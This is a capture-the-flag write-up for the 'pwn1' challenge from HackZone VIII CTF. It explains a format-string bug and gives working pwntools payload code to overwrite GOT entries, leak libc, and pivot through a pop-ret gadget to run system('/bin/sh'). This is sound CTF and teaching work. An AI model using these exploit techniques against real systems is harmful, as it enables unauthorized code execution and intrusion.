
## pwn1
### Description

> `nc 79gq4l5zpv1aogjgw6yhhymi4.ctf.p0wnhub.com 11337`
>
> Download: https://storage.ctf.p0wnhub.com/pwn/bd456fb72d202f4e6e6302d98de83196-pwn1.zip
>
> Author: RETTILA


### Attachment

[pwn1](https://cdn.jsdelivr.net/gh/TaQini/ctf@master/HackZoneVIIICTF/pwn/pwn1/pwn1)

### Analysis

#### fmtstr vulnerability

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char buf; // [rsp+10h] [rbp-40h]
  char format[8]; // [rsp+20h] [rbp-30h]

  strcpy(format, "Easiest printf in HZVIII...\nWelcome %s");
  read(0, &buf, 0x20uLL);
  printf(format, &buf, argv);
  fflush(_bss_start);
  exit(0);
}
```

Reading `0x20` bytes to `buf[0x10]` cause that the next variable `format` would be overwritten by the last `0x10` bytes of input string.

### Solution

#### repeat exploit it

overwrite `exit` GOT to `main`:

```python
# exit -> main & leak libc
payload = ''
payload += p64(elf.got['exit'])+p64(elf.got['read'])
payload = payload.ljust(16,'A')
payload +=  '%%%dc'%(elf.sym['main']&0xffff)
payload += '%8$hn%9$s'
payload = payload.ljust(31,'B')

sl(payload)
```

> now we can repeat exploit the format string vulnerability for unlimited times

#### leak libc

We can leak address of `read` in libc at the same time:


```python
data = ru('\x0a\x6e\x20\x48\x5a')[-6:]
read = uu64(data)
info_addr('read',read)
```
> output: read: 0x7fdd43f58350

then use `libc-database` to figure out the version of libc:

```shell
% ./find read 350
ubuntu-trusty-amd64-libc6 (id libc6_2.19-0ubuntu6.14_amd64)
```

calc the base address of libc:

```python
libcbase = read-libc.sym['read']
info_addr('libcbase',libcbase)
```

#### getshell

At first, I tried to use `one_gadget`, but finally failed. I couldn't meet the constraints of `one_gadget`.

```c
0x46428 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4647c execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xe9415 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xea36d execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

> too strict

Then I tried to overwrite `system` to `__free_hook`  and use `%10000c` to trigger `free` , but failed again. (succeed in local but failed in remote)

Finally I found that we can set `rdi` to `'/bin/sh'` while calling `printf` . And the input string was stored in stack. So we can puts the address of system into stack and use gadget `pop-ret` to call `system('/bin/sh')`.

#### find the gadget

we need overwrite the address of gadget `pop-pop-pop-pop-ret` to `printf` GOT 

```python
p4r = libcbase + 0x00054f95

pl2 = ''
pl2 += p64(elf.got['printf'])
pl2 = pl2.ljust(16,'C')
pl2 += '%%%dc'%(p4r&0xffff)
pl2 += '%8$hn'
pl2 = pl2.ljust(31,'D')
print pl2

sl(pl2)
```

and the current values of `printf` is its real address in `libc`, so we can find gadget in `libc`.

if `gadget` is near `printf` , we just need to overwrite the last 2 bytes.

```python
In [1]: from pwn import *

In [2]: libc=ELF('./libc.so.6')
[*] '/home/taqini/Downloads/hzctf/pwn1/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

In [3]: hex(libc.sym['printf'])
Out[3]: '0x54340'
```

> offset of `printf` is `0x54340`

```c
% ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret" --all > gadget
% cat gadget | grep "00005.... : pop"
// ...
0x0000000000054f95 : pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
// ...
```

> choose gadget at `0x00054f95`

#### layout of regs/stack

input `aaaabaaacaaadaaaeaaafaaagaaahaaa` and see the layout of regs after `printf` called:

![](http://image.taqini.space/img/20200412144953.png)

> `rdi` = eaaa (offset=16)
>
> `rsp+0x18` = aaaa (offset=0)

so in the next time calling `printf` puts `'/bin/sh'` and the address of `system` into proper place:

```python
pl3 = 'A'*8+p64(system)
pl3+= '/bin/sh\0'
sl(pl3)
```

finally `system("/bin/sh")` was executed.

### More

you can download full exp from my [github](https://github.com/TaQini/ctf/tree/master/HackZoneVIIICTF/pwn/pwn1) 


